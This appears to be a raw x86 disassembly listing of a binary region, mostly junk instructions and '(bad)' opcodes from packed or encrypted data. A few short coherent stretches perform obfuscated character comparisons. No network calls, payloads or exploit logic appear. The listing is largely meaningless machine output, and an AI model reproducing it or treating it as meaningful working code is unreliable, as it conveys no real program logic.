  410ba7:	into   
  410ba8:	jb     0x410b2f
  410baa:	mov    bl,0x2b
  410bac:	lahf   
  410bad:	ja     0x410c07
  410baf:	popa   
  410bb0:	pusha  
  410bb1:	sbb    esp,0xffffffdb
  410bb4:	sub    ecx,ebx
  410bb6:	fistp  DWORD PTR [eax+0x7fb3b50]
  410bbc:	mov    eax,ds:0xc4970df
  410bc1:	pop    ss
  410bc2:	sahf   
  410bc3:	test   al,0x33
  410bc5:	ins    DWORD PTR es:[edi],dx
  410bc6:	(bad)  
  410bc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410bc8:	jg     0x410bb9
  410bca:	stc    
  410bcb:	out    0x8f,al
  410bcd:	xor    BYTE PTR [ebx],bh
  410bcf:	mov    dl,0x9d
  410bd1:	pop    es
  410bd2:	repz cmp DWORD PTR [bp+si-0x7a],eax
  410bd7:	cmp    edi,DWORD PTR [ebp-0x10dcb77]
  410bdd:	jns    0x410be7
  410bdf:	out    0x44,eax
  410be1:	push   ebp
  410be2:	lds    ebp,FWORD PTR [edx+0x1bba0704]
  410be8:	sahf   
  410be9:	ret    0x51b2
  410bec:	xchg   ecx,eax
  410bed:	(bad)  
  410bee:	xchg   edx,eax
  410bef:	mov    DWORD PTR [eax+0x53],ebp
  410bf2:	into   
  410bf3:	dec    edi
  410bf4:	outs   dx,DWORD PTR ds:[esi]
  410bf5:	mov    bh,0xdd
  410bf8:	imul   edi,DWORD PTR [esi+0xcaa1b51],0x40176373
  410c02:	ins    DWORD PTR es:[edi],dx
  410c03:	shl    BYTE PTR [esi+esi*1-0x13],1
  410c07:	js     0x410b91
  410c09:	stc    
  410c0a:	push   ss
  410c0b:	pop    es
  410c0c:	adc    eax,0x8199367
  410c11:	or     BYTE PTR [edx+0x2356a956],al
  410c17:	mov    ch,0x15
  410c19:	add    edx,DWORD PTR [ecx]
  410c1b:	gs ret 
  410c1d:	lds    eax,FWORD PTR [edi-0x6a]
  410c20:	mov    ecx,0x389e5a43
  410c25:	(bad)  
  410c26:	cmp    BYTE PTR [edi],bh
  410c28:	push   0x22
  410c2a:	inc    ebx
  410c2b:	das    
  410c2c:	mov    esi,DWORD PTR [ebp+0x8bedffe]
  410c32:	dec    esp
  410c33:	push   esp
  410c34:	loop   0x410bde
  410c36:	adc    esi,DWORD PTR [edi]
  410c38:	add    eax,0x35dd8db4
  410c3d:	add    al,0x84
  410c3f:	test   al,0x69
  410c41:	pop    edx
  410c42:	bound  eax,QWORD PTR [ebx]
  410c44:	hlt    
  410c45:	push   0x43713881
  410c4a:	cmp    bh,0x4f
  410c4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c4e:	jb     0x410bd7
  410c50:	ins    BYTE PTR es:[edi],dx
  410c51:	dec    eax
  410c52:	jne    0x410cb2
  410c54:	mov    cl,0x87
  410c56:	sbb    al,0x5f
  410c58:	sbb    BYTE PTR [edi-0x3cb551ac],bh
  410c5e:	mov    ebp,0xfd540017
  410c63:	jp     0x410bf7
  410c65:	jnp    0x410c00
  410c67:	dec    ebx
  410c68:	or     DWORD PTR [edi+0x457dc116],0xffffff95
  410c6f:	mov    edx,0x5d736678
  410c74:	inc    ebx
  410c75:	in     eax,0x5e
  410c77:	neg    DWORD PTR [esi]
  410c79:	and    BYTE PTR [edi+0x6264d8f8],ch
  410c7f:	cmp    DWORD PTR [ecx+0x40c5ac4d],ebx
  410c85:	push   esp
  410c86:	pop    eax
  410c87:	xor    edx,DWORD PTR [edi+edx*8+0x13]
  410c8b:	push   edi
  410c8c:	ins    BYTE PTR es:[edi],dx
  410c8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c8e:	fist   DWORD PTR [edx+0x5c]
  410c91:	push   ds
  410c92:	nop
  410c93:	push   DWORD PTR [esi+0x3c1593a2]
  410c99:	lods   al,BYTE PTR ds:[esi]
  410c9a:	shl    BYTE PTR [ecx-0x17],cl
  410c9d:	lock ds inc ebp
  410ca0:	popf   
  410ca1:	pop    sp
  410ca3:	pop    edi
  410ca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ca5:	or     ecx,DWORD PTR [eax+0x4e]
  410ca8:	frndint 
  410caa:	lods   al,BYTE PTR ds:[esi]
  410cab:	jb     0x410c89
  410cad:	loope  0x410cc8
  410caf:	aaa    
  410cb0:	outs   dx,DWORD PTR ds:[esi]
  410cb1:	or     al,0x4
  410cb3:	jo     0x410ccc
  410cb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410cb6:	(bad)  
  410cb8:	sub    al,0x78
  410cba:	cs push esi
  410cbc:	xor    eax,0x146ce26a
  410cc1:	repz mov ebx,cs
  410cc4:	daa    
  410cc5:	xor    DWORD PTR [ebp-0x2cb8ad02],edi
  410ccb:	ds loope 0x410d0e
  410cce:	repnz fidiv DWORD PTR [eax+0x2e]
  410cd2:	pop    ebp
  410cd3:	xchg   ecx,eax
  410cd4:	cmp    DWORD PTR [esi+0x30],esi
  410cd7:	fidivr DWORD PTR [ebp-0x56eeedea]
  410cdd:	lods   al,BYTE PTR ds:[esi]
  410cde:	fdiv   st(3),st
  410ce0:	pop    esi
  410ce1:	push   ds
  410ce2:	call   0xaf2cfe5f
  410ce7:	xchg   ebp,eax
  410ce8:	xchg   ebp,eax
  410ce9:	icebp  
  410cea:	or     eax,0x2be1a2fe
  410cef:	mov    cl,0xe4
  410cf1:	cld    
  410cf2:	clc    
  410cf3:	popf   
  410cf4:	jno    0x410d1c
  410cf6:	sbb    ch,BYTE PTR [edx]
  410cf8:	das    
  410cf9:	mov    eax,0x354a27ad
  410cfe:	ffree  st(6)
  410d00:	ins    DWORD PTR es:[edi],dx
  410d01:	push   esp
  410d02:	in     al,dx
  410d03:	jg     0x410d27
  410d05:	and    al,0x36
  410d07:	sbb    DWORD PTR ds:0x89944097,edi
  410d0d:	add    cl,BYTE PTR [ebx-0x361607bb]
  410d13:	add    al,BYTE PTR [eax]
  410d15:	add    BYTE PTR [eax+ebp*1-0x2a],dh
  410d19:	push   cs
  410d1a:	push   edx
  410d1b:	lock je 0x410d8e
  410d1e:	outs   dx,BYTE PTR ds:[esi]
  410d1f:	dec    ecx
  410d20:	mov    edi,0x71dbfc9c
  410d25:	(bad)  
  410d26:	jmp    0x410ce0
  410d28:	jle    0x410da8
  410d2a:	scas   eax,DWORD PTR es:[edi]
  410d2b:	jl     0x410dab
  410d2d:	jle    0x410d17
  410d2f:	adc    ch,BYTE PTR [esi-0x75a5e5]
  410d35:	dec    eax
  410d36:	mov    ds:0xdfe7e68e,al
  410d3b:	push   ss
  410d3c:	push   cs
  410d3d:	dec    ebp
  410d3e:	cdq    
  410d3f:	mov    esp,0xeea5e75a
  410d44:	imul   eax,edi,0x61
  410d47:	jnp    0x410d3c
  410d49:	sbb    al,BYTE PTR [ecx]
  410d4b:	lods   eax,DWORD PTR ds:[esi]
  410d4c:	fwait
  410d4d:	test   al,0x8a
  410d4f:	sbb    DWORD PTR [ebx],edx
  410d51:	jmp    0x439d:0xe6c8e1eb
  410d58:	in     eax,dx
  410d59:	pop    ecx
  410d5a:	test   DWORD PTR [edx],0x83827dc2
  410d60:	cmp    DWORD PTR [ecx+0x6f08346f],ecx
  410d66:	or     ch,BYTE PTR [edi]
  410d68:	frstor [ebp-0x3d3d9c6d]
  410d6e:	jp     0x410dd3
  410d70:	fwait
  410d71:	mov    edx,0x575cf8f0
  410d76:	add    dh,cl
  410d78:	sub    eax,DWORD PTR [ebp-0x4a151154]
  410d7e:	shr    BYTE PTR [esp+eiz*8+0x1347fc26],0x53
  410d86:	ret    
  410d87:	leave  
  410d88:	mov    dh,0x64
  410d8a:	pop    edx
  410d8b:	loopne 0x410d6a
  410d8d:	cmp    ch,BYTE PTR [ecx]
  410d8f:	jne    0x410df4
  410d91:	outs   dx,BYTE PTR ds:[esi]
  410d92:	ss cwde 
  410d94:	push   esi
  410d95:	jnp    0x410d25
  410d97:	mov    edi,0x6e6f25a0
  410d9c:	repz mov al,0xdd
  410d9f:	mov    dl,0x5c
  410da1:	xor    BYTE PTR [eax+ecx*2+0x42],0xbf
  410da6:	mov    esi,0x9412cad1
  410dab:	add    ebx,DWORD PTR [eax+0xfb64da0]
  410db1:	mov    cl,0xa1
  410db3:	aad    0x1c
  410db5:	(bad)  
  410db6:	jmp    0x36eb:0xbbbdf335
  410dbd:	(bad)  
  410dbe:	in     eax,0x4e
  410dc0:	adc    BYTE PTR [edx],0xea
  410dc3:	adc    al,0x2d
  410dc5:	mov    ebx,0x6e256abb
  410dca:	xchg   esp,eax
  410dcb:	in     al,dx
  410dcc:	ffree  st(5)
  410dce:	xchg   edi,eax
  410dcf:	xor    eax,0x5141d326
  410dd4:	sbb    esi,esp
  410dd6:	test   ebp,esi
  410dd8:	sub    DWORD PTR [edi],ebp
  410dda:	dec    ecx
  410ddb:	adc    DWORD PTR [edi-0x1a439468],edx
  410de1:	retf   0x671b
  410de4:	mov    al,0xa3
  410de6:	(bad)  
  410de7:	mov    fs,WORD PTR [eax-0x1f]
  410dea:	push   ss
  410deb:	sbb    ebp,0x53
  410dee:	shl    BYTE PTR ss:[esi-0x36a0e4e5],cl
  410df5:	inc    eax
  410df6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410df7:	mov    ebx,0x529baf1b
  410dfc:	push   esp
  410dfd:	pop    edi
  410dfe:	sub    bl,bl
  410e00:	les    edx,FWORD PTR [esi]
  410e02:	cld    
  410e03:	xor    ecx,DWORD PTR [ebp+0x58]
  410e06:	fst    DWORD PTR [edx+0x4f155dfb]
  410e0c:	adc    eax,0x29f5ca0f
  410e11:	or     al,0xe
  410e13:	mov    al,0x56
  410e15:	lahf   
  410e16:	jbe    0x410ded
  410e18:	mov    cl,0x74
  410e1a:	or     ah,BYTE PTR [edx-0x2b]
  410e1d:	xor    eax,0xfad0aa52
  410e22:	aas    
  410e23:	inc    DWORD PTR [eax-0x15cbb6ec]
  410e29:	stos   BYTE PTR es:[edi],al
  410e2a:	test   DWORD PTR [edx+0x79],0xde7ec0c0
  410e31:	mov    BYTE PTR [ecx+0x73],dl
  410e34:	pop    ecx
  410e35:	js     0x410e97
  410e37:	xchg   esp,eax
  410e38:	pop    eax
  410e39:	xchg   edx,eax
  410e3a:	dec    ebx
  410e3b:	mov    edx,0x383f1740
  410e40:	xor    eax,0x46ff5ebd
  410e45:	cmp    eax,0x1304c53d
  410e4a:	add    eax,0x84da2e29
  410e4f:	xchg   ebx,eax
  410e50:	inc    ebp
  410e51:	loope  0x410dd8
  410e53:	enter  0xdb8e,0xfc
  410e57:	repnz shl BYTE PTR [esi],1
  410e5a:	pusha  
  410e5b:	pop    ecx
  410e5c:	and    eax,0xe95f4a5d
  410e61:	and    edi,edx
  410e63:	jmp    0x410e99
  410e65:	mov    ds:0xea196e2b,eax
  410e6a:	clc    
  410e6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e6c:	arpl   WORD PTR [edx-0x27580e51],dx
  410e72:	mov    ch,0xd7
  410e74:	mov    ah,0xc4
  410e76:	fild   WORD PTR [eax+0x9]
  410e79:	ss stc 
  410e7b:	mov    cl,0xee
  410e7d:	mov    eax,0xaf12e17e
  410e82:	sar    ch,0x6a
  410e85:	push   ecx
  410e86:	mov    edx,0x6204de47
  410e8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410e8c:	cs sub bl,dh
  410e8f:	sub    ecx,DWORD PTR [esi]
  410e91:	sub    eax,0x285f6770
  410e96:	int3   
  410e97:	inc    ebx
  410e98:	mov    esi,0xc791f5b
  410e9d:	and    dl,BYTE PTR [esi+0x57]
  410ea0:	xlat   BYTE PTR ds:[ebx]
  410ea1:	mov    esp,0xb9ef3c45
  410ea6:	retf   
  410ea7:	sbb    BYTE PTR [ebx],cl
  410ea9:	and    DWORD PTR [edx-0x5876e6dc],esp
  410eaf:	push   ebx
  410eb0:	lods   eax,DWORD PTR ds:[esi]
  410eb1:	mov    es:0xacf9df31,eax
  410eb7:	pop    ebp
  410eb8:	inc    ebp
  410eb9:	scas   eax,DWORD PTR es:[edi]
  410eba:	imul   ecx,edx,0x2db5040b
  410ec0:	xchg   esi,eax
  410ec1:	int3   
  410ec2:	jo     0x410ef2
  410ec4:	jmp    0xad3fefb6
  410ec9:	push   0x2bcd104d
  410ece:	leave  
  410ecf:	add    ecx,DWORD PTR [esi+0x4b3981bf]
  410ed5:	add    DWORD PTR [esi],eax
  410ed7:	rol    BYTE PTR [ecx],cl
  410ed9:	xchg   edx,eax
  410eda:	push   edi
  410edb:	enter  0xf8d7,0xfa
  410edf:	fs pop eax
  410ee1:	push   cs
  410ee2:	mul    ah
  410ee4:	mov    eax,0x94950003
  410ee9:	jne    0x410f22
  410eeb:	popf   
  410eec:	pushf  
  410eed:	push   ebp
  410eee:	mov    WORD PTR [edi-0x21],?
  410ef1:	(bad)  [esi-0x7a62ecbf]
  410ef7:	jg     0x410eaf
  410ef9:	retf   0x13a4
  410efc:	xlat   BYTE PTR ds:[ebx]
  410efd:	in     eax,dx
  410efe:	xor    BYTE PTR [ebx+0x47],0x37
  410f02:	in     eax,0xb4
  410f04:	mov    ds:0x375b8cf9,al
  410f09:	sbb    al,0x2
  410f0b:	push   eax
  410f0c:	fidiv  DWORD PTR [ecx]
  410f0e:	xor    bh,BYTE PTR [eax-0x78d3c574]
  410f14:	ret    0x619a
  410f17:	mul    BYTE PTR [edx-0x4ad70f8f]
  410f1d:	iret   
  410f1e:	in     eax,dx
  410f1f:	pop    edi
  410f20:	jle    0x410f6b
  410f22:	jmp    0x410f1c
  410f24:	xchg   edx,eax
  410f25:	lods   al,BYTE PTR ds:[esi]
  410f26:	lods   eax,DWORD PTR ds:[esi]
  410f27:	xor    BYTE PTR [ebp-0x62],bh
  410f2a:	shrd   DWORD PTR [ebx-0x40],esi,cl
  410f2e:	test   BYTE PTR [esi],0xf
  410f31:	sbb    eax,0x70422d38
  410f36:	scas   eax,DWORD PTR es:[edi]
  410f37:	inc    ebx
  410f38:	xchg   ebp,eax
  410f39:	fisub  WORD PTR [ebp-0xfae6726]
  410f3f:	fsqrt  
  410f41:	mov    ebx,0x7f9bcc1
  410f46:	clc    
  410f47:	inc    edi
  410f48:	test   al,0x5d
  410f4a:	sbb    esp,edi
  410f4c:	cli    
  410f4d:	mov    dh,0xd1
  410f4f:	add    cl,BYTE PTR [ebx+0x7e]
  410f52:	and    BYTE PTR ds:0xe5da6716,al
  410f58:	push   edi
  410f59:	mov    dh,0x83
  410f5b:	jg     0x410fb2
  410f5d:	lods   al,BYTE PTR ds:[esi]
  410f5e:	or     edi,esp
  410f60:	mov    esp,0x5f47bd3
  410f65:	fiadd  WORD PTR [edx]
  410f67:	imul   esp,edx,0xc056bb0a
  410f6d:	cmp    BYTE PTR ss:[edi],bl
  410f70:	push   0x89aa22fe
  410f75:	frndint 
  410f77:	pop    ecx
  410f78:	or     cl,BYTE PTR [ebp+0x18b69b72]
  410f7e:	xchg   BYTE PTR [edi-0x780fc438],cl
  410f84:	mov    ecx,DWORD PTR [edx+0x66]
  410f87:	test   BYTE PTR [edi],0x42
  410f8a:	daa    
  410f8b:	aam    0x63
  410f8d:	arpl   WORD PTR [edx],cx
  410f8f:	inc    ebp
  410f90:	in     al,dx
  410f91:	push   0x64e09a79
  410f96:	cmc    
  410f97:	jmp    0xf627eda
  410f9c:	out    dx,al
  410f9d:	retf   0x3726
  410fa0:	(bad)  
  410fa1:	and    al,0x60
  410fa3:	sti    
  410fa4:	sbb    esi,DWORD PTR [eax+ecx*8-0x33]
  410fa8:	push   eax
  410fa9:	xor    edx,DWORD PTR [ebx]
  410fab:	out    0xa7,eax
  410fad:	sti    
  410fae:	jne    0x41100a
  410fb0:	call   ecx
  410fb2:	lea    ebx,[ebx]
  410fb4:	xchg   esp,eax
  410fb5:	xor    BYTE PTR [ebp+0x361ce47f],bl
  410fbb:	rcr    BYTE PTR [ebx],cl
  410fbd:	mov    cl,0xdb
  410fbf:	mov    eax,ds:0x3caac4fd
  410fc4:	and    eax,0xf680a03e
  410fc9:	and    al,0x24
  410fcb:	push   es
  410fcc:	scas   al,BYTE PTR es:[edi]
  410fcd:	loopne 0x41102f
  410fcf:	cmp    DWORD PTR [eax+0x51c208cb],eax
  410fd5:	ds stos BYTE PTR es:[edi],al
  410fd7:	adc    DWORD PTR [esi-0x29b7d54d],esi
  410fdd:	int3   
  410fde:	inc    ecx
  410fdf:	xor    eax,ecx
  410fe1:	add    eax,esi
  410fe3:	mov    DWORD PTR [ebp+0x8],eax
  410fe6:	mov    eax,DWORD PTR [ebp+0x8]
  410fe9:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fed:	mov    dl,BYTE PTR [ebp-0x1]
  410ff0:	cmp    al,dl
  410ff2:	je     0x411303
  410ff8:	mov    eax,DWORD PTR [ebp+0x8]
  410ffb:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  410fff:	mov    edx,DWORD PTR [ebp+0xc]
  411002:	cmp    al,BYTE PTR [edx]
  411004:	jne    0x4115f7
  41100a:	mov    eax,DWORD PTR [ebp-0x8]
  41100d:	mov    edx,DWORD PTR [ebp+0xc]
  411010:	movsx  edx,BYTE PTR [edx]
  411013:	xor    eax,ecx
  411015:	add    eax,esi
  411017:	cmp    edx,eax
  411019:	jmp    0x4112e7
  41101e:	jmp    0x411054
  411020:	push   esp
  411021:	dec    ebx
  411022:	push   ecx
  411023:	imul   esi,ecx,0xffffffb4
  411026:	and    DWORD PTR [edx-0x16],esi
  411029:	loope  0x411033
  41102b:	sbb    ebx,DWORD PTR [ecx]
  41102d:	mov    dl,0x18
  41102f:	inc    edi
  411030:	jle    0x4110b0
  411032:	scas   eax,DWORD PTR es:[edi]
  411033:	jl     0x4110b3
  411035:	jle    0x411077
  411037:	xchg   ebx,eax
  411038:	mov    WORD PTR [edx+esi*2],?
  41103b:	retf   
  41103c:	mov    ds:0x3bbbabcb,eax
  411041:	inc    eax
  411042:	xor    ch,BYTE PTR [ebx+0x761196eb]
  411048:	pop    ds
  411049:	popf   
  41104a:	and    bh,BYTE PTR [esi]
  41104c:	inc    eax
  41104d:	(bad)
  411050:	(bad)  
  411051:	jo     0x411086
  411053:	sub    bh,BYTE PTR [edi]
  411055:	imul   ecx,DWORD PTR [ecx+0x30c6238d],0xffffffcc
  41105c:	rcr    BYTE PTR [edx-0x22],cl
  41105f:	xor    dl,BYTE PTR [ecx+0xe385d81]
  411065:	outs   dx,BYTE PTR ds:[esi]
  411066:	lods   al,BYTE PTR ds:[esi]
  411067:	pop    esi
  411068:	(bad)  
  411069:	mov    ds,WORD PTR [edx]
  41106b:	xchg   edi,eax
  41106c:	rol    bh,1
  41106e:	jbe    0x410ffa
  411070:	std    
  411071:	inc    esp
  411072:	lods   al,BYTE PTR ds:[esi]
  411073:	push   ds
  411074:	stc    
  411075:	push   cs
  411076:	inc    ebx
  411077:	push   ds
  411078:	push   ecx
  411079:	and    BYTE PTR [ebx+0x11],bh
  41107c:	punpckhdq mm2,mm7
  41107f:	out    dx,eax
  411080:	cmp    eax,0x419916b0
  411085:	or     eax,esi
  411087:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411088:	(bad)  
  411089:	fadd   QWORD PTR [ecx+ebp*4+0x7b]
  41108d:	dec    eax
  41108e:	adc    al,0xbe
  411091:	pop    es
  411092:	cmp    dh,dl
  411094:	mov    edi,0x4ef9b385
  411099:	xlat   BYTE PTR ds:[ebx]
  41109a:	addr16 aas 
  41109c:	sub    eax,0xd73d2f00
  4110a1:	lea    ecx,[ebx+ebx*4-0x4d]
  4110a5:	call   0xcc91f79d
  4110aa:	xchg   edx,eax
  4110ab:	test   DWORD PTR [eax],ebp
  4110ad:	mov    dl,0xaf
  4110af:	in     al,dx
  4110b0:	inc    edi
  4110b1:	loop   0x411076
  4110b3:	or     dh,cl
  4110b5:	pusha  
  4110b6:	mov    ch,dh
  4110b8:	js     0x41104d
  4110ba:	sbb    eax,0x3185048a
  4110bf:	ficomp DWORD PTR [ebp-0x77]
  4110c2:	mov    al,0x41
  4110c4:	rcr    BYTE PTR [ecx],0x5
  4110c7:	sbb    eax,DWORD PTR [esi-0x6e1d84a5]
  4110cd:	dec    esi
  4110ce:	and    DWORD PTR [ebx],eax
  4110d0:	and    cl,BYTE PTR [eax]
  4110d2:	(bad)  
  4110d4:	pop    eax
  4110d5:	jecxz  0x411104
  4110d7:	push   eax
  4110d8:	stos   BYTE PTR es:[edi],al
  4110d9:	lahf   
  4110da:	retf   
  4110db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110dc:	dec    ecx
  4110dd:	in     al,0xbe
  4110df:	dec    ebp
  4110e0:	mov    ah,0xe5
  4110e2:	adc    BYTE PTR [edi-0x5d802913],0x54
  4110e9:	das    
  4110ea:	mov    bh,0x5a
  4110ec:	add    BYTE PTR [edi+esi*2],bl
  4110ef:	xor    bl,BYTE PTR [esi]
  4110f1:	retf   
  4110f2:	dec    edx
  4110f3:	xor    dl,BYTE PTR ds:[eax+0x694f109d]
  4110fa:	(bad)  
  4110fb:	sub    DWORD PTR [ebx-0x79b1fbfc],esi
  411101:	push   ebx
  411102:	jl     0x4110e4
  411104:	ja     0x4110cd
  411106:	iret   
  411107:	add    BYTE PTR [edi],bl
  411109:	fwait
  41110a:	scas   eax,DWORD PTR es:[edi]
  41110b:	xlat   BYTE PTR ds:[ebx]
  41110c:	retf   
  41110d:	cmp    ch,BYTE PTR [esi+edx*2-0x85b535e]
  411114:	push   ds
  411115:	mov    DWORD PTR [edi],ebp
  411117:	mov    bh,0xfb
  411119:	mov    eax,ds:0x42d0ed05
  41111e:	xchg   ecx,eax
  41111f:	xchg   esi,eax
  411120:	sub    esp,DWORD PTR [edi+0x4bb104f0]
  411126:	outs   dx,BYTE PTR ds:[esi]
  411127:	xor    ch,bl
  411129:	add    edx,esi
  41112b:	in     eax,0x25
  41112d:	or     dl,BYTE PTR [edx+eiz*1-0x2195964d]
  411134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411135:	cmp    ebp,esp
  411137:	enter  0xa35b,0x66
  41113b:	sub    dl,ah
  41113d:	jnp    0x411181
  41113f:	dec    edx
  411140:	mov    dh,BYTE PTR [edx]
  411142:	push   ebp
  411143:	mov    ch,0xee
  411145:	and    DWORD PTR [ebx+0x5bbe2ef5],esp
  41114b:	mov    bl,0xad
  41114d:	sahf   
  41114e:	jg     0x411195
  411150:	icebp  
  411151:	jb     0x411180
  411153:	xchg   edx,eax
  411154:	outs   dx,BYTE PTR ds:[esi]
  411155:	fdiv   st(7),st
  411157:	pop    ecx
  411158:	out    0x8f,al
  41115a:	out    0x53,al
  41115c:	std    
  41115d:	call   DWORD PTR [ebx-0x38fc3ff9]
  411163:	cmp    bh,al
  411165:	add    DWORD PTR [edx-0x1d],edx
  411168:	lea    esi,[ecx+0x3]
  41116b:	mov    cl,0x7b
  41116d:	call   0x7972ac56
  411172:	call   DWORD PTR [edi]
  411174:	rcr    esp,0x28
  411177:	pop    ds
  411178:	int3   
  411179:	push   ss
  41117a:	and    eax,0x67f77eaf
  41117f:	jns    0x4111be
  411181:	lods   al,BYTE PTR ds:[esi]
  411182:	push   ebx
  411183:	out    0x7e,eax
  411185:	cmp    DWORD PTR [ebp-0x470aa340],0xffffff83
  41118c:	retf   
  41118d:	dec    edx
  41118e:	std    
  41118f:	test   DWORD PTR [eax-0x66],esp
  411192:	cwde   
  411193:	gs je  0x41115a
  411196:	std    
  411197:	push   edx
  411198:	and    al,0x20
  41119a:	in     al,0x20
  41119c:	das    
  41119d:	movhps xmm0,QWORD PTR [eax]
  4111a0:	jl     0x4111af
  4111a2:	inc    esi
  4111a3:	add    ebp,DWORD PTR [ebx+0x59]
  4111a6:	outs   dx,DWORD PTR ds:[esi]
  4111a7:	sar    DWORD PTR [edx+ecx*1+0x30],0x56
  4111ac:	push   cs
  4111ad:	xor    esi,eax
  4111af:	leave  
  4111b0:	or     ah,ah
  4111b2:	jmp    0x35468adf
  4111b7:	inc    eax
  4111b8:	(bad)  
  4111b9:	(bad)  
  4111bb:	xchg   DWORD PTR [ebx+ebp*4],ebp
  4111be:	ins    BYTE PTR es:[edi],dx
  4111bf:	and    al,0xd6
  4111c1:	imul   ebx,DWORD PTR ds:[ebx+edx*8+0x4a966fc4],0x9ca40efa
  4111cd:	out    dx,al
  4111ce:	scas   eax,DWORD PTR es:[edi]
  4111cf:	sbb    ch,BYTE PTR [ecx-0x3c]
  4111d2:	pusha  
  4111d3:	jmp    0x7bc6:0x89f1ee09
  4111da:	aaa    
  4111db:	test   BYTE PTR [esi+0x4d7555c9],cl
  4111e1:	sub    edi,DWORD PTR [ebp+0x54c00c02]
  4111e7:	shr    BYTE PTR [ebp-0x3a8bf33c],1
  4111ed:	sub    BYTE PTR [ebx],bh
  4111ef:	inc    edi
  4111f0:	dec    eax
  4111f1:	push   ebx
  4111f2:	enter  0xcc76,0x69
  4111f6:	stc    
  4111f7:	in     al,dx
  4111f8:	das    
  4111f9:	mov    cl,0x3c
  4111fb:	int3   
  4111fc:	test   al,0x46
  4111fe:	sbb    DWORD PTR [ebp+0x1],0x38
  411202:	fsub   QWORD PTR [ecx-0x790d5c6f]
  411208:	test   eax,0x8756085e
  41120d:	cli    
  41120e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41120f:	or     al,0x70
  411211:	fild   WORD PTR ds:0xaa01b483
  411217:	repz mov bl,0x3c
  41121a:	dec    esi
  41121b:	sbb    DWORD PTR ds:0x9ec19a9c,ebp
  411221:	sbb    DWORD PTR [esi],esi
  411223:	push   0xffffffd8
  411225:	iret   
  411226:	inc    edx
  411227:	leave  
  411228:	shr    dl,0xb5
  41122b:	and    cl,cl
  41122d:	or     al,0xd0
  41122f:	test   BYTE PTR ds:0x5c09ac12,bl
  411235:	inc    ecx
  411236:	mov    ds:0x54725243,eax
  41123b:	popa   
  41123c:	mov    bl,0x65
  41123e:	push   ss
  41123f:	and    BYTE PTR [edx+0x1b30451f],ah
  411245:	adc    BYTE PTR ds:0x142eeefc,0x83
  41124c:	sub    bh,cl
  41124e:	rcl    BYTE PTR [ebp+ebx*2-0x507a8ce8],1
  411255:	shl    BYTE PTR [edx-0x32],cl
  411258:	pop    esi
  411259:	(bad)  
  41125b:	jne    0x4112c8
  41125d:	hlt    
  41125e:	into   
  41125f:	or     esi,eax
  411261:	mov    bl,0x45
  411263:	cdq    
  411264:	popa   
  411265:	rcl    DWORD PTR ds:0x89ed0acd,cl
  41126b:	dec    esi
  41126c:	lahf   
  41126d:	lds    esi,FWORD PTR [eax+ebp*1+0x52]
  411271:	sub    al,0xc
  411273:	pop    ebp
  411274:	cmp    esp,edx
  411276:	dec    ebp
  411277:	sbb    ah,BYTE PTR gs:[ecx+eax*4+0x3]
  41127c:	lea    edx,[edi+0x493ba21b]
  411282:	dec    ebp
  411283:	push   ss
  411284:	(bad)  
  411285:	imul   esi,DWORD PTR [ebp+0x75e87ab4],0x26
  41128c:	sub    BYTE PTR [ecx-0x69e94a57],0x60
  411293:	jmp    0x3eaadd9c
  411298:	or     ebx,edx
  41129a:	jb     0x411308
  41129c:	pop    ebx
  41129d:	jmp    DWORD PTR [esi]
  41129f:	adc    ch,dl
  4112a1:	sub    DWORD PTR [eax+0x72],0xffffffc6
  4112a5:	push   DWORD PTR [edi+0x61b7c14a]
  4112ab:	inc    ecx
  4112ac:	jae    0x41127f
  4112ae:	sti    
  4112af:	addr16 xchg esp,eax
  4112b1:	push   ss
  4112b2:	xchg   ebp,eax
  4112b3:	out    dx,eax
  4112b4:	fsub   st(7),st
  4112b6:	push   esp
  4112b7:	xchg   esi,eax
  4112b8:	fdivr  DWORD PTR [edx-0x6c]
  4112bb:	dec    ebp
  4112bc:	and    eax,0xa363df05
  4112c1:	jae    0x41129f
  4112c3:	cmp    BYTE PTR [eax],ah
  4112c5:	mov    dl,0xb8
  4112c7:	enter  0x3279,0x64
  4112cb:	ds js  0x41125c
  4112ce:	inc    ecx
  4112cf:	mov    ecx,0xa1f2d943
  4112d4:	into   
  4112d5:	int3   
  4112d6:	xchg   ebp,eax
  4112d7:	mov    al,ds:0xbf41bbd7
  4112dc:	add    DWORD PTR [ecx+0x66],0x83a38e76
  4112e3:	push   edx
  4112e4:	mov    es,WORD PTR [edx]
  4112e6:	pop    edx
  4112e7:	je     0x4115eb
  4112ed:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0xcd68f61e,eax
  411318:	mov    dl,0x9a
  41131a:	aas    
  41131b:	dec    ecx
  41131c:	inc    ebp
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x41135d
  411324:	enter  0x2460,0x75
  411328:	outs   dx,DWORD PTR ds:[esi]
  411329:	or     eax,0x1e6d2ec9
  41132e:	and    DWORD PTR [edi+0x15],edx
  411331:	lahf   
  411332:	jns    0x411301
  411334:	cmc    
  411335:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411336:	mov    cl,0x52
  411338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411339:	push   edi
  41133a:	and    al,0x1a
